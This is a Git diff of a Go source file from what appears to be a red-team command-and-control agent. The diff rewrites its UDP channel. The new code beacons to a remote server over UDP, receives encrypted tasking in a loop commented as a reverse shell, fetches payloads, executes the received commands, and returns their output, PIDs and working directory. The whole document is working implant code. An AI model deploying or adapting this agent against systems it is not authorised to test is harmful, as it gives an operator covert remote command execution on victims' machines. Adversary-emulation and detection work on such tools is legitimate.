@@ -1,14 +1,19 @@
 package sockets
 
 import (
-	"github.com/preludeorg/pneuma/util"
+	"bufio"
+	"bytes"
 	"encoding/json"
-	"fmt"
+	"github.com/preludeorg/pneuma/commands"
+	"github.com/preludeorg/pneuma/util"
+	"io"
 	"log"
 	"net"
+	"os"
+	"strings"
 )
 
-type UDP struct { }
+type UDP struct {}
 
 func init() {
 	CommunicationChannels["udp"] = UDP{}
@@ -16,13 +21,56 @@ func init() {
 
 func (contact UDP) Communicate(address string, sleep int, beacon Beacon) {
 	for {
-	   conn, err := net.Dial("udp", address)
-	   if err == nil {
-		   data, _ := json.Marshal(beacon)
-		   fmt.Fprintf(conn, string(util.Encrypt(data)))
-		} else {
-			log.Print(fmt.Sprintf("[-] %s", err))
+		conn, err := net.Dial("udp", address)
+	   	if err != nil {
+	   		log.Printf("[-] %s is either unavailable or a firewall is blocking traffic.", address)
+	   	} else {
+	   		udpListen(conn, beacon)
+	   	}
+	   	jitterSleep(sleep, "UDP")
+	}
+}
+
+func udpListen(conn net.Conn, beacon Beacon) {
+	//initial beacon
+	udpBufferedSend(conn, beacon)
+
+	//reverse-shell
+    scanner := bufio.NewScanner(conn)
+    for scanner.Scan() {
+		message := strings.TrimSpace(scanner.Text())
+		go udpRespond(conn, beacon, message)
+    }
+}
+
+func udpRespond(conn net.Conn, beacon Beacon, message string){
+	var tempB Beacon
+	json.Unmarshal([]byte(util.Decrypt(message)), &tempB)
+	beacon.Links = beacon.Links[:0]
+	for _, link := range tempB.Links {
+		if len(link.Payload) > 0 {
+			requestPayload(link.Payload)
 		}
-		jitterSleep(sleep * 10, "UDP")
+		response, status, pid := commands.RunCommand(link.Request, link.Executor)
+		link.Response = strings.TrimSpace(response) + "\r\n"
+		link.Status = status
+		link.Pid = pid
+		beacon.Links = append(beacon.Links, link)
+	}
+	pwd, _ := os.Getwd()
+	beacon.Pwd = pwd
+	udpBufferedSend(conn, beacon)
+}
+
+func udpBufferedSend(conn net.Conn, beacon Beacon) {
+	data, _ := json.Marshal(beacon)
+	allData := bytes.NewReader(append(util.Encrypt(data), "\n"...))
+	sendBuffer := make([]byte, 1024)
+	for {
+		_, err := allData.Read(sendBuffer)
+		if err == io.EOF {
+			return
+		}
+		conn.Write(sendBuffer)
 	}
 }
